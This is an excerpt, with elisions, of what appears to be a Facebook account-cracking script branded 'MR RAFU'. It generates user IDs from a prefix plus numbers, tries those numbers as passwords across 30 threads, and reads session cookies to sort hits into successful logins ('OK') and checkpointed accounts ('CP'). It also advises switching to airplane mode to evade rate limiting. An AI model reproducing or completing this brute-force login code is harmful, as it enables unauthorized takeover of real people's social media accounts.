...
def random_pak_number():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('\033[1;37;1m[$] MR RAFU  HAS BEEN STARTED...(\033[1;92mBANGLADESH\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru]
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[RAFU-OK😍] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[RAFU-CP😭] '+cid+' | '+ps+'\033[0;97m')
